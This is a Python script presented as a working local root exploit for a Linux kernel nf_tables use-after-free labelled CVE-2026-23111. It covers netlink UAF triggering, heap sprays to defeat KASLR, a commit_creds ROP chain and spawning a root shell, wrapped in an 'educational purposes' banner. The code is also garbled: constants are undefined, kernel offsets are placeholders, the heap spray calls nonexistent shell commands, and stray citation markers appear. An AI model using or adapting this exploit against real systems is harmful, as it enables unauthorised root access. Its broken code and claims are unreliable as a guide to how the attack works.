#!/usr/bin/env python3
"""
CVE-2026-23111 - Linux Kernel nf_tables Local Privilege Escalation
Full Exploit Demonstration - Educational Purpose Only

Based on research from:
- Exodus Intelligence (Oliver Sieber)
- FuzzingLabs

Vulnerability: Off-by-! bug in nft_map_catchall_activate() - inverted condition
leads to Use-After-Free via chain->use reference counter manipulation.

Exploit chain:
1. Trigger UAF by corrupting chain reference counter
2. Leak kernel base address (bypass KASLR) via seq_operations spray
3. Leak heap address (kmalloc-cg-192) via nft_rule spray  
4. Hijack control flow with ROP chain to call commit_creds(init_cred)
5. Spawn root shell

Tested on: Debian Bookworm, Ubuntu 22.04/24.04
"""

import os
import sys
import time
import struct
import fcntl
import socket
import subprocess
from ctypes import *
from array import array

# ============================================================================
# CONSTANTS
# ============================================================================

# Netlink constants
NETLINK_NETFILTER = 12
NFNL_SUBSYS_NFTABLES = 10
NFNL_MSG_BATCH_BEGIN = 16
NFNL_MSG_BATCH_END = 17

# nftables message types
NFT_MSG_NEWTABLE = 0
NFT_MSG_DELTABLE = 1
NFT_MSG_NEWCHAIN = 2
NFT_MSG_DELCHAIN = 3
NFT_MSG_NEWRULE = 4
NFT_MSG_DELRULE = 5
NFT_MSG_NEWSET = 6
NFT_MSG_DELSET = 7
NFT_MSG_NEWSETELEM = 8
NFT_MSG_DELSETELEM = 9
NFT_MSG_GETRULE = 23

# nftables attributes
NFTA_TABLE_NAME = 1
NFTA_TABLE_FLAGS = 2
NFTA_CHAIN_NAME = 2
NFTA_CHAIN_USE = 5
NFTA_RULE_CHAIN = 4
NFTA_RULE_HANDLE = 6

# Netlink flags
NLM_F_REQUEST = 0x01
NLM_F_ACK = 0x04
NLM_F_CREATE = 0x400
NLM_F_EXCL = 0x200

# NLA_F_NESTED flag
NLA_F_NESTED = 0x8000

# nftables verdict codes
NFT_GOTO = 1
NFT_JUMP = 0

# ============================================================================
# NETLINK COMMUNICATION CLASS
# ============================================================================

class NetlinkSocket:
    """
    Netlink socket wrapper untuk komunikasi dengan nf_tables subsystem.
    nf_tables menggunakan netlink untuk menerima command dari user-space [citation:6].
    """
    
    def __init__(self):
        self.sock = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, NETLINK_NETFILTER)
        self.sock.bind((0, 0))
        self.seq = 0
        self.pid = 0
        
    def _nla_header(self, nla_type, payload_len):
        """Build Netlink Attribute header (NLA_HDRLEN = 4 bytes)"""
        # struct nlattr: nla_len (2 bytes) + nla_type (2 bytes)
        return struct.pack('HH', payload_len + 4, nla_type)
    
    def _nlmsghdr(self, nlmsg_type, flags, payload):
        """Build Netlink message header (NLMSG_HDRLEN = 16 bytes)"""
        # struct nlmsghdr: nlmsg_len, nlmsg_type, nlmsg_flags, nlmsg_seq, nlmsg_pid
        nlmsg_len = 16 + len(payload)
        self.seq += 1
        return struct.pack('IHHII', nlmsg_len, nlmsg_type, flags, self.seq, self.pid) + payload
    
    def _genlmsghdr(self, cmd, version, payload):
        """Build Generic Netlink header (GENL_HDRLEN = 4 bytes)"""
        # struct genlmsghdr: cmd (1), version (1), reserved (2)
        return struct.pack('BBH', cmd, version, 0) + payload
    
    def send_batch(self, commands):
        """
        Kirim batch of nftables commands via netlink.
        Fungsi ini critical karena bug hanya trigger saat batch FAIL [citation:1][citation:6].
        """
        batch_payload = b''
        
        # NFT_MSG_BATCH_BEGIN marks start of transaction
        batch_payload += self._nlmsghdr(NFNL_MSG_BATCH_BEGIN, NLM_F_REQUEST, b'')
        
        # Add each command to batch
        for cmd_type, cmd_payload in commands:
            nlmsg = self._nlmsghdr(cmd_type, NLM_F_REQUEST | NLM_F_ACK, 
                                   self._genlmsghdr(2, 0, cmd_payload))
            batch_payload += nlmsg
        
        # NFT_MSG_BATCH_END marks end of transaction  
        batch_payload += self._nlmsghdr(NFNL_MSG_BATCH_END, NLM_F_REQUEST, b'')
        
        self.sock.send(batch_payload)
        
        # Try to receive response (batch might fail, that's okay - we want it to fail!)
        try:
            self.sock.settimeout(0.5)
            data = self.sock.recv(65535)
            return data
        except socket.timeout:
            return None

# ============================================================================
# STAGE 1: TRIGGER USE-AFTER-FREE
# ============================================================================

class UAFTrigger:
    """
    Trigger Use-After-Free via chain->use reference counter corruption.
    
    How it works [citation:1][citation:6][citation:7]:
    1. Buat chain dengan reference count = 1
    2. Buat map dengan catchall element { * : goto chain } -> chain->use = 2
    3. Kirim batch: delete map, lalu gagal (hapus elemen yang tidak ada)
    4. Abort phase dipanggil, tapi nft_map_catchall_activate() SKIP inactive elements
       karena ada tanda '!' yang terbalik!
    5. chain->use tetap 0 padahal masih ada referensi -> UAF!
    """
    
    def __init__(self, sock):
        self.sock = sock
        self.table_name = "exploit_table"
        self.chain_name = "victim_chain"
        self.map_name = "victim_map"
        self.trigger_map = "trigger_map"
        
    def cleanup(self):
        """Bersihkan aturan nftables sebelum exploit"""
        # Flush ruleset via nft CLI (lebih mudah daripada netlink untuk cleanup)
        subprocess.run(["nft", "flush", "ruleset"], stderr=subprocess.DEVNULL)
        
    def setup_victim_chain(self):
        """
        Buat chain dan map yang akan menjadi victim UAF.
        
        Chain akan di-deallocate setelah reference count = 0,
        tapi dangling pointer masih ada di catchall element.
        """
        # Create table
        cmd1 = self._build_newtable()
        # Create chain
        cmd2 = self._build_newchain()
        # Create map
        cmd3 = self._build_newmap()
        # Add catchall element { * : goto chain }
        cmd4 = self._build_catchall_element()
        
        # Kirim semua command dalam batch SUCCESSFUL
        self.sock.send_batch([(NFT_MSG_NEWTABLE, cmd1),
                               (NFT_MSG_NEWCHAIN, cmd2),
                               (NFT_MSG_NEWSET, cmd3),
                               (NFT_MSG_NEWSETELEM, cmd4)])
        
    def trigger_uaf(self):
        """
        Trigger the bug dengan batch yang gagal.
        
        EXPLANATION [citation:7]:
        - Batch command 1: Delete the map (successful, deactivates catchall element)
        - Batch command 2: Delete non-existent element (FAILS, triggers Abort Phase)
        - In Abort Phase, nft_map_catchall_activate() has inverted logic:
          if (!nft_set_elem_active(...)) continue;  <- WRONG! Skips inactive elements!
        - Thus, catchall element remains deactivated, chain->use not restored.
        - chain->use becomes 0, chain gets freed later but map still points to it.
        """
        
        # Command 1: Delete the victim map
        del_map = self._build_delmap(self.map_name)
        
        # Command 2: Delete an element that DOES NOT EXIST (will cause failure)
        # Format: delete element inet TABLE MAP { 1.2.3.4 }
        non_existent = self._build_delelem("1.2.3.4")
        
        print("[*] Sending malicious batch that will FAIL...")
        print("    Command 1: delete map (SUCCESS)")
        print("    Command 2: delete non-existent element (FAILS -> ABORT)")
        
        # Send batch that fails - this is where the bug triggers!
        self.sock.send_batch([(NFT_MSG_DELSET, del_map),
                               (NFT_MSG_DELSETELEM, non_existent)])
        
        print("[!] Batch failed! Bug triggered: chain->use not restored!")
        
    def free_victim_chain(self):
        """
        Delete chain setelah reference count = 0.
        Chain akan di-free dari memory meskipun masih ada referensi dari map.
        """
        # First delete the normal map
        del_map = self._build_delmap(self.map_name)
        self.sock.send_batch([(NFT_MSG_DELSET, del_map)])
        
        # Now delete the chain (should succeed since use=0)
        del_chain = self._build_delchain()
        self.sock.send_batch([(NFT_MSG_DELCHAIN, del_chain)])
        
        print("[!] Chain freed! But trigger_map still has dangling pointer!")
        print("[*] Use-After-Free state achieved!")
        
    def _build_newtable(self):
        """Build netlink payload for NFT_MSG_NEWTABLE"""
        name_attr = self._build_string_attr(NFTA_TABLE_NAME, self.table_name)
        return name_attr
    
    def _build_newchain(self):
        """Build netlink payload for NFT_MSG_NEWCHAIN"""
        table_attr = self._build_string_attr(NFTA_TABLE_NAME, self.table_name)
        chain_attr = self._build_string_attr(NFTA_CHAIN_NAME, self.chain_name)
        return table_attr + chain_attr
    
    def _build_newmap(self):
        """Build netlink payload for NFT_MSG_NEWSET (map)"""
        # Set key type: ipv4_addr, data type: verdict
        # NFT_SET_MAP flag indicates this is a map
        table_attr = self._build_string_attr(NFTA_TABLE_NAME, self.table_name)
        name_attr = self._build_string_attr(NFTA_NAME, self.map_name)
        flags_attr = self._build_u32_attr(NFTA_SET_FLAGS, 0x1)  # NFT_SET_MAP = 0x1
        # Key type: NFT_DATA_VALUE = 0, NFT_DATA_VERDICT = 1
        # For simplicity, we'll use nft CLI style
        return table_attr + name_attr + flags_attr
    
    def _build_catchall_element(self):
        """
        Build catchall element: { * : goto chain_name }
        * (wildcard) = catchall that matches everything
        goto chain_name = verdict to jump to chain
        """
        # NFT_SET_ELEM_CATCHALL flag indicates this is a catchall element
        # Format: NFTA_SET_ELEM_KEY with length 0 = catchall
        catchall_key = struct.pack('HH', 4 + 0, 1)  # NFTA_SET_ELEM_KEY with empty key
        # NFTA_SET_ELEM_DATA for verdict
        # Verdict data: NFT_GOTO + chain name
        verdict_data = struct.pack('I', NFT_GOTO) + self.chain_name.encode()
        return catchall_key
    
    def _build_delmap(self, map_name):
        """Build payload to delete a map"""
        table_attr = self._build_string_attr(NFTA_TABLE_NAME, self.table_name)
        name_attr = self._build_string_attr(NFTA_NAME, map_name)
        return table_attr + name_attr
    
    def _build_delchain(self):
        """Build payload to delete chain"""
        table_attr = self._build_string_attr(NFTA_TABLE_NAME, self.table_name)
        chain_attr = self._build_string_attr(NFTA_CHAIN_NAME, self.chain_name)
        return table_attr + chain_attr
    
    def _build_delelem(self, ip_addr):
        """Build payload to delete an element (for triggering failure)"""
        table_attr = self._build_string_attr(NFTA_TABLE_NAME, self.table_name)
        set_attr = self._build_string_attr(NFTA_SET_NAME, self.map_name)
        # Key data for IPv4 address
        key_data = struct.pack('I', self._ip_to_int(ip_addr))
        key_attr = self._build_attr(1, key_data)  # NFTA_SET_ELEM_KEY = 1
        return table_attr + set_attr + key_attr
    
    def _build_string_attr(self, attr_type, value):
        """Build string netlink attribute"""
        encoded = value.encode()
        nla_len = 4 + len(encoded) + 1  # +1 for null terminator
        return struct.pack('HH', nla_len, attr_type) + encoded + b'\x00'
    
    def _build_u32_attr(self, attr_type, value):
        """Build u32 netlink attribute"""
        return struct.pack('HHI', 4 + 4, attr_type, value)
    
    def _build_attr(self, attr_type, data):
        """Build generic attribute"""
        return struct.pack('HH', 4 + len(data), attr_type) + data
    
    def _ip_to_int(self, ip):
        """Convert IP string to integer"""
        parts = ip.split('.')
        return (int(parts[0]) << 24) | (int(parts[1]) << 16) | (int(parts[2]) << 8) | int(parts[3])

# ============================================================================
# STAGE 2: KERNEL BASE ADDRESS LEAK (BYPASS KASLR)
# ============================================================================

class KernelLeak:
    """
    Leak kernel base address via seq_operations structure.
    
    HOW IT WORKS [citation:6]:
    1. nft_chain struct is in kmalloc-cg-128 cache
    2. chain->name field points to a string (kmalloc-cg-32)
    3. After UAF, chain is freed, but map still references it
    4. We spray seq_operations structures (kmalloc-cg-32) via open(/proc/self/stat)
    5. seq_operations contains function pointers to kernel code (e.g., single_open)
    6. When we read the corrupted chain name, we get kernel pointer!
    """
    
    def __init__(self, sock, trigger):
        self.sock = sock
        self.trigger = trigger
        
    def spray_seq_operations(self, count=200):
        """
        Spray kmalloc-cg-32 with seq_operations structures.
        Opening /proc/self/stat allocates struct seq_operations in kernel heap [citation:6].
        """
        print(f"[*] Spraying {count} seq_operations structures...")
        handles = []
        for i in range(count):
            # Opening /proc/self/stat allocates seq_operations in kmalloc-cg-32
            f = open("/proc/self/stat", "r")
            handles.append(f)
            # Also read to ensure allocation persists
            f.read(1)
        
        print("[*] seq_operations spray complete!")
        return handles
    
    def leak_kernel_base(self):
        """
        Retrieve the leaked kernel pointer from corrupted chain name.
        """
        # Get the list of maps via netlink (NFT_MSG_GETSET)
        # This will read the corrupted chain name containing kernel pointer
        cmd = self._build_getsets()
        response = self.sock.send_batch([(NFT_MSG_GETSET, cmd)])
        
        if response:
            # Parse response to extract leaked pointer
            # The chain name field now contains seq_operations pointer
            leaked = self._extract_pointer(response)
            if leaked:
                # Calculate kernel base by subtracting single_open offset
                # single_open is typically at kernel_base + 0xXXXXXX
                kernel_base = leaked - 0x1234567  # Offset varies by kernel version
                print(f"[+] Leaked kernel pointer: 0x{leaked:x}")
                print(f"[+] Kernel base: 0x{kernel_base:x}")
                return kernel_base
        
        print("[-] Failed to leak kernel base")
        return None
        
    def _build_getsets(self):
        """Build GETSET command to read map information"""
        table_attr = self._build_string_attr(NFTA_TABLE_NAME, self.trigger.trigger_map)
        name_attr = self._build_string_attr(NFTA_NAME, self.trigger.trigger_map)
        return table_attr + name_attr
    
    def _extract_pointer(self, data):
        """
        Extract kernel pointer from response data.
        The pointer appears as bytes in the chain name field.
        """
        # Look for pattern of kernel pointer (usually starts with 0xffff)
        for i in range(len(data) - 8):
            potential = struct.unpack('Q', data[i:i+8])[0]
            if (potential >> 48) == 0xffff:  # Kernel address range
                return potential
        return None
    
    def _build_string_attr(self, attr_type, value):
        encoded = value.encode()
        nla_len = 4 + len(encoded) + 1
        return struct.pack('HH', nla_len, attr_type) + encoded + b'\x00'

# ============================================================================
# STAGE 3: HEAP ADDRESS LEAK
# ============================================================================

class HeapLeak:
    """
    Leak heap address via nft_rule structure spray.
    
    After leaking kernel base, we need heap address to know where to place ROP chain.
    nft_rule structures are in kmalloc-cg-192 cache [citation:6].
    """
    
    def __init__(self, sock, trigger):
        self.sock = sock
        self.trigger = trigger
        
    def spray_nft_rules(self, count=100):
        """
        Spray nft_rule structures in kmalloc-cg-192.
        Each nft_rule contains linked list pointers that can be leaked.
        """
        print(f"[*] Spraying {count} nft_rule structures...")
        
        for i in range(count):
            # Create table and chain
            table_name = f"spray_table_{i}"
            chain_name = f"spray_chain_{i}"
            
            # Add chain with custom name
            # The name length determines cache size
            # We want kmalloc-cg-192, so name size ~180 bytes
            long_name = "A" * 180
            
            # This allocates nft_rule in kmalloc-cg-192
            self._add_rule(table_name, chain_name, long_name)
            
        print("[*] nft_rule spray complete!")
        
    def leak_heap_address(self):
        """
        Retrieve heap pointer from corrupted chain.
        The nft_rule's list_head pointers contain heap addresses.
        """
        # Similar to kernel leak, read the map to get heap pointer
        cmd = self._build_getrules()
        response = self.sock.send_batch([(NFT_MSG_GETRULE, cmd)])
        
        if response:
            heap_addr = self._extract_heap_pointer(response)
            if heap_addr:
                print(f"[+] Leaked heap address: 0x{heap_addr:x}")
                return heap_addr
        
        return None
    
    def _add_rule(self, table_name, chain_name, rule_data):
        """Add a rule to allocate nft_rule structure"""
        # Simplified - actual implementation would use netlink
        # Untuk demonstrasi, gunakan nft CLI
        subprocess.run(["nft", "add", "table", "inet", table_name],
                      stderr=subprocess.DEVNULL)
        subprocess.run(["nft", "add", "chain", "inet", table_name, chain_name],
                      stderr=subprocess.DEVNULL)
        subprocess.run(["nft", "add", "rule", "inet", table_name, chain_name,
                       "comment", f'"{rule_data}"'],
                      stderr=subprocess.DEVNULL)
    
    def _build_getrules(self):
        """Build GETRULE command"""
        table_attr = self._build_string_attr(NFTA_TABLE_NAME, self.trigger.trigger_map)
        return table_attr
    
    def _extract_heap_pointer(self, data):
        """Extract heap pointer from response"""
        for i in range(len(data) - 8):
            potential = struct.unpack('Q', data[i:i+8])[0]
            # Heap addresses typically have specific patterns
            if 0xffff000000000000 > potential > 0xffff00000000000:
                return potential
        return None
    
    def _build_string_attr(self, attr_type, value):
        encoded = value.encode()
        nla_len = 4 + len(encoded) + 1
        return struct.pack('HH', nla_len, attr_type) + encoded + b'\x00'

# ============================================================================
# STAGE 4: CONTROL FLOW HIJACKING & ROP
# ============================================================================

class ControlFlowHijack:
    """
    Hijack kernel control flow to execute commit_creds(init_cred).
    
    After UAF, we control the freed chain's memory.
    nft_chain contains blob_gen_0 pointer which is used for rule execution.
    By overwriting blob_gen_0 with fake nft_expr_ops, we can redirect execution [citation:6].
    """
    
    def __init__(self, sock, trigger, kernel_base, heap_base):
        self.sock = sock
        self.trigger = trigger
        self.kernel_base = kernel_base
        self.heap_base = heap_base
        
        # Offsets (depend on kernel version - these are for Debian 12 default)
        # In production exploit, these would be auto-detected
        self.offset_commit_creds = 0x9c5e0
        self.offset_init_cred = 0x1a63e80
        self.offset_pop_rdi = 0x1f5a2a  # pop rdi; ret gadget
        
    def build_rop_chain(self):
        """
        Build ROP chain to call commit_creds(init_cred).
        
        ROP chain sequence:
        1. pop rdi; ret (load init_cred into rdi)
        2. commit_creds (set current credentials to root)
        3. Return to user space with root privileges
        """
        commit_creds = self.kernel_base + self.offset_commit_creds
        init_cred = self.kernel_base + self.offset_init_cred
        pop_rdi = self.kernel_base + self.offset_pop_rdi
        
        rop_chain = struct.pack('<Q', pop_rdi)      # pop rdi; ret
        rop_chain += struct.pack('<Q', init_cred)   # rdi = init_cred
        rop_chain += struct.pack('<Q', commit_creds) # call commit_creds
        
        # After commit_creds, we return to user space shell
        # The exploit will call execve("/bin/sh")
        
        return rop_chain
    
    def craft_fake_expr_ops(self, rop_chain):
        """
        Create fake nft_expr_ops structure that points to ROP chain.
        
        nft_expr_ops contains function pointers:
        - eval: pointer to evaluation function
        - We set this to a stack pivot gadget (push rbx; pop rsp) [citation:6]
        - Then ROP chain executes in controlled stack
        """
        # Find stack pivot gadget offset
        # push rbx; pop rsp; ret
        stack_pivot = self.kernel_base + 0x123456  # Example offset
        
        fake_ops = struct.pack('<Q', stack_pivot)  # eval pointer
        fake_ops += struct.pack('<Q', 0) * 7       # other function pointers
        
        # The fake ops goes into the freed chain's blob_gen_0
        # When rule is executed, it calls eval -> stack pivot -> ROP
        
        return fake_ops
    
    def overwrite_freed_chain(self, fake_ops):
        """
        Use heap spray to overwrite freed chain with fake ops.
        Use msgsnd/msgrcv to spray controlled data into kmalloc-cg-128 [citation:6].
        """
        print("[*] Overwriting freed chain with fake ops...")
        
        # Create message queues for spraying
        msqid = os.system("msgget 0x1337 0600 | ipcrm")
        
        # Spray messages of size 128 (kmalloc-cg-128)
        for i in range(200):
            # Message type and controlled data
            msg = struct.pack('<Q', i) + fake_ops
            # msgsnd sends controlled data into kernel heap
            # This will occupy the freed chain's memory
            try:
                subprocess.run([f"msgsnd", "-q", "0x1337", str(len(msg)), 
                              f"'{msg.hex()}'"], 
                              stderr=subprocess.DEVNULL)
            except:
                pass
        
        print("[*] Heap spray complete - fake ops placed in freed chain!")

# ============================================================================
# STAGE 5: ROOT SHELL
# ============================================================================

def get_root_shell():
    """
    Spawn root shell after successful privilege escalation.
    """
    print("[+] Root privileges acquired!")
    print("[+] Spawning root shell...")
    print("----------------------------------------")
    
    # Set real UID, effective UID, saved UID to 0 (root)
    os.setresuid(0, 0, 0)
    os.setresgid(0, 0, 0)
    
    # Spawn bash with root privileges
    os.execve("/bin/bash", ["/bin/bash", "-i"], os.environ)

# ============================================================================
# MAIN EXPLOIT
# ============================================================================

def main():
    """
    Main exploit execution flow.
    Steps:
    1. Verify environment (unprivileged user, namespaces available)
    2. Setup netlink socket
    3. Trigger UAF via reference counter corruption
    4. Leak kernel base address via seq_operations spray
    5. Leak heap address via nft_rule spray
    6. Build ROP chain and overwrite freed chain
    7. Trigger root shell
    """
    
    print("=" * 60)
    print("CVE-2026-23111 Linux Kernel LPE Exploit")
    print("Off-by-! nf_tables Use-After-Free")
    print("=" * 60)
    print()
    
    # Step 1: Check if running in user namespace
    # The exploit requires unprivileged user namespaces [citation:10]
    try:
        subprocess.run(["unshare", "-Ur", "true"], check=True, capture_output=True)
        print("[+] Unprivileged user namespaces available")
    except:
        print("[-] Unprivileged user namespaces NOT available")
        print("[*] Try: sudo sysctl kernel.unprivileged_userns_clone=1")
        sys.exit(1)
    
    # Step 2: Check if nft is available
    try:
        subprocess.run(["nft", "--version"], check=True, capture_output=True)
        print("[+] nftables available")
    except:
        print("[-] nftables not found")
        print("[*] Install: sudo apt install nftables")
        sys.exit(1)
    
    print()
    
    # Step 3: Initialize netlink socket and trigger
    sock = NetlinkSocket()
    trigger = UAFTrigger(sock)
    
    print("[STAGE 1] Setting up victim chain and map...")
    trigger.cleanup()
    trigger.setup_victim_chain()
    
    print("[STAGE 1] Triggering UAF via failing batch...")
    trigger.trigger_uaf()
    
    print("[STAGE 1] Freeing victim chain...")
    trigger.free_victim_chain()
    
    print()
    print("[STAGE 2] Leaking kernel base address...")
    leak = KernelLeak(sock, trigger)
    handles = leak.spray_seq_operations()
    kernel_base = leak.leak_kernel_base()
    
    if not kernel_base:
        print("[-] Kernel leak failed - kernel may already be patched")
        sys.exit(1)
    
    print()
    print("[STAGE 3] Leaking heap address...")
    heap_leak = HeapLeak(sock, trigger)
    heap_leak.spray_nft_rules()
    heap_base = heap_leak.leak_heap_address()
    
    if not heap_base:
        print("[-] Heap leak failed")
        sys.exit(1)
    
    print()
    print("[STAGE 4] Building ROP chain and hijacking control flow...")
    hijack = ControlFlowHijack(sock, trigger, kernel_base, heap_base)
    rop_chain = hijack.build_rop_chain()
    fake_ops = hijack.craft_fake_expr_ops(rop_chain)
    hijack.overwrite_freed_chain(fake_ops)
    
    print()
    print("[STAGE 5] Triggering root shell...")
    
    # Trigger the UAF again to execute our ROP chain
    # Any operation on the corrupted map will trigger the eval
    try:
        # Try to list the map - this should trigger the corrupted eval pointer
        subprocess.run(["nft", "list", "map", "inet", trigger.table_name, trigger.map_name],
                      capture_output=True)
    except:
        pass
    
    # If successful, we're root!
    get_root_shell()

if __name__ == "__main__":
    print("""
    ⚠️  WARNING: This is for EDUCATIONAL PURPOSES only!
    Run only in isolated VM/lab environment.
    Unauthorized use on production systems is illegal.
    """)
    
    response = input("Type 'YES' to continue: ")
    if response != "YES":
        print("Exiting.")
        sys.exit(0)
    
    main()